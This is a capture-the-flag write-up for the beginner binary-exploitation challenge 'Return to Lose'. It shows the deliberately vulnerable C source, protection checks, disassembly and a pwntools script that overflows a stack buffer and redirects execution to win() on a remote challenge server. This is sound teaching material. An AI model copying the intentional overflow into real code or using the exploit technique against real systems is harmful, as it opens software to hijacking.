# LYKN CTF — Return to Lose (pwn)

**Challenge Name:** Return to Lose  
**Category:** pwn (binary exploitation)  
**Difficulty:** Beginner  
**Flag:** `LYKNCTF{97907ee12ae04a298b30bb15d1c863a6}`

---

## Table of Contents

- [Challenge Summary](#challenge-summary)
- [Initial Analysis](#initial-analysis)
- [Vulnerability Discovery](#vulnerability-discovery)
- [Exploit Strategy](#exploit-strategy)
- [Exploit Script](#exploit-script)
- [Reproduction Steps](#reproduction-steps)
- [Tools Used](#tools-used)
- [Lessons Learned](#lessons-learned)

---

## Challenge Summary

We are given a 64-bit ELF binary (`vuln`) and its source code (`vuln.c`). The binary is a simple terminal program that asks for a name, prints a farewell message, and exits. There is a function called `win()` that reads and prints the flag, but this function is **never called** in normal execution. Our goal is to redirect execution to `win()` through a buffer overflow.

---

## Initial Analysis

### Source Code (`vuln.c`)

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

void win(void)
{
    char flag[128];
    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) {
        write(1, "flag.txt not found on this server.\n", 35);
        _exit(1);
    }
    ssize_t n = read(fd, flag, sizeof(flag));
    if (n > 0)
        write(1, flag, (size_t)n);
    _exit(0);
}

void vuln(void)
{
    char buf[64];
    write(1, "What's your name, traveler?\n> ", 30);
    read(0, buf, 256);
    write(1, "Safe travels!\n", 14);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

### Binary Properties

```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
      dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
      not stripped

$ checksec --file=vuln
    RELRO: Partial RELRO
    Stack Canary: No canary found
    NX: NX enabled
    PIE: No PIE (0x400000)
```

| Protection | Status | Impact |
|------------|--------|--------|
| **Stack Canary** | ❌ Disabled | Buffer overflow can overwrite return address directly |
| **PIE** | ❌ No PIE | All code addresses are fixed — no leak needed |
| **NX** | ✅ Enabled | Cannot execute shellcode on stack, must use ROP |
| **RELRO** | Partial | GOT is writable (not needed here) |

### Disassembly of `vuln()`

```
$ objdump -d vuln | grep -A30 "<vuln>:"
0000000000401246 <vuln>:
  40124e: sub rsp, 0x40          ; allocate 64 bytes for buf
  401266: lea rax, [rbp-0x40]    ; buf is at rbp-0x40
  40126a: mov edx, 0x100         ; read 256 bytes
  401277: call read@plt
  401292: ret
```

**Key observations:**
- `buf` is at `rbp - 0x40` (64 bytes)
- `read()` reads up to 256 bytes — 4× the buffer size
- No canary check before `ret`
- Return address is at `rbp + 8`
- `win()` is at address `0x4011b6`

### Stack Layout in `vuln()`

```
                +-------------------+
rbp+8           | return address    |  ← we overwrite this with win()
rbp             | saved rbp         |  ← we overwrite this (8 bytes)
rbp-0x40 (=buf) | buffer [64 bytes] |  ← our input starts here
                +-------------------+
```

---

## Vulnerability Discovery

The vulnerability is a **classic stack buffer overflow**:

1. `buf` is 64 bytes (`0x40`) on the stack
2. `read(0, buf, 256)` reads up to 256 bytes into `buf`
3. Any input beyond 64 bytes overflows into the saved `rbp` and return address
4. Since there is **no stack canary**, we can overwrite the return address freely
5. Since there is **no PIE**, the address of `win()` is always `0x4011b6`

---

## Exploit Strategy

### Concept

1. Pad 72 bytes (64 for buffer + 8 for saved rbp)
2. Add a `ret` gadget to fix 16-byte stack alignment (required by x86-64 ABI for `movaps` instructions)
3. Jump to `win()` which reads and outputs `flag.txt`

### Stack Alignment Detail

On x86-64, when a function is entered via `call`, `rsp % 16 == 8`. Libc functions (including `open`, `read`, `write`, `printf`) use `movaps` instructions that require `rsp % 16 == 0`. If we jump directly to `win()`, the stack will be misaligned and the function will crash on the first `movaps`.

By adding a single `ret` gadget before `win()`, we pop the return address and advance `rsp` by 8, bringing it back to 16-byte alignment.

```
Before vuln's ret:   rsp % 16 == 8
After vuln's ret:    rsp % 16 == 0  (pops win address)
ret gadget fires:    rsp % 16 == 8  (pops, aligns for win)
win() executes:      rsp % 16 == 0  (call pushes return addr)
```

### Payload Structure

```
[A x 72] + [ret gadget] + [win address]
  └─ padding    └─ align    └─ redirect to win()
```

---

## Exploit Script

### `solve.py`

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Addresses (no PIE — fixed)
win = 0x4011b6       # function that prints the flag
ret = 0x40101a       # ret gadget for stack alignment

# Connect to remote
p = remote('51.79.140.18', 10368)

# Receive prompt
p.recvuntil(b'> ')

# Build payload: 64 bytes buf + 8 bytes saved rbp + ret + win
payload = b'A' * 72            # overflow buffer + saved rbp
payload += p64(ret)            # stack alignment gadget
payload += p64(win)            # redirect to win()

# Send exploit
p.send(payload)

# Receive the flag
import time
time.sleep(1)
flag = p.recv(timeout=3)
print("Flag:", flag.decode().strip())

p.close()
```

---

## Reproduction Steps

### Step 1: Copy files to a working directory

```powershell
cp "C:\Users\moriarty\Downloads\return to lose\*" C:\tools\ctf\
cd C:\tools\ctf\
```

### Step 2: Analyze the binary

```bash
# Check protections
checksec --file=vuln

# Find win() address
objdump -d vuln | grep "<win>:"

# Find ret gadget
ROPgadget --binary vuln | grep ": ret$"

# Disassemble vuln() to see stack layout
objdump -d vuln | grep -A30 "<vuln>:"
```

### Step 3: Run the exploit

```bash
python3 solve.py
```

### Step 4: Confirm the flag

```
Flag: LYKNCTF{97907ee12ae04a298b30bb15d1c863a6}
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **pwntools** | Python library for exploit development (remote connection, payload packing) |
| **objdump** | Binary disassembly to find function addresses and stack layout |
| **checksec** | Binary protection analysis (canary, PIE, NX, RELRO) |
| **ROPgadget** | Find ROP gadgets (ret for stack alignment) |
| **netcat / nc** | Manual interaction with the remote service |

---

## Lessons Learned

### Beginner Takeaways

1. **Buffer overflow without canary is a free win**: If a binary lacks stack canaries and you control the input size, you can overwrite the return address trivially.

2. **Non-PIE binaries have predictable addresses**: When PIE is disabled, all `.text` section addresses (like `win()`) are fixed. No memory leak is required.

3. **Stack alignment matters on x86-64**: The `movaps` instruction in libc functions requires 16-byte stack alignment. A single `ret` gadget fixes misalignment when jumping between functions.

4. **Read the source code**: When source is provided, the vulnerability is obvious. In this case, `read(0, buf, 256)` vs `char buf[64]` is a textbook overflow.

5. **The "return to lose" pun**: The challenge name hints at returning to a function that should never be reached — a classic "ret2win" or "return-oriented" exploitation technique.

---

## Full Disassembly

```
$ objdump -d vuln

00000000004011b6 <win>:
  4011b6: endbr64
  4011ba: push   %rbp
  4011bb: mov    %rsp,%rbp
  4011be: sub    $0x90,%rsp
  4011c5: mov    $0x0,%esi
  4011ca: lea    0xe4e(%rip),%rax        # 402004 "flag.txt"
  4011d1: mov    %rax,%rdi
  4011d4: mov    $0x0,%eax
  4011d9: call   open@plt
  ...
  401229: call   _exit@plt

0000000000401246 <vuln>:
  401246: endbr64
  40124a: push   %rbp
  40124b: mov    %rsp,%rbp
  40124e: sub    $0x40,%rsp
  401252: mov    $0x1e,%edx
  401257: mov    $0x402040,%esi
  40125c: mov    $0x1,%edi
  401261: call   write@plt
  401266: lea    -0x40(%rbp),%rax
  40126a: mov    $0x100,%edx
  40126f: mov    %rax,%rsi
  401272: mov    $0x0,%edi
  401277: call   read@plt
  40127c: mov    $0xe,%edx
  401281: mov    $0x40205f,%esi
  401286: mov    $0x1,%edi
  40128b: call   write@plt
  401290: nop
  401291: leave
  401292: ret
```

---
